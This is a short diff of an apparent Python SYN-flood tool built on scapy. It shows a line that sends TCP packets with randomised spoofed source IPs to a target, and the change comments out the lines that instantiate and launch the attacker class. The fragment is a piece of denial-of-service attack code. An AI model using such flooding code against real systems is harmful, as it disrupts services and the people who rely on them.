@@ -26,5 +26,5 @@ class SynFlooadAttacker():
                 send(IP(src=randIP,dst=self.target)/TCP(sport=22,dport=dport),count=self.atkcount/4)
 
 
-atk = SynFlooadAttacker()
-atk.attack()
+#atk = SynFlooadAttacker()
+#atk.attack()
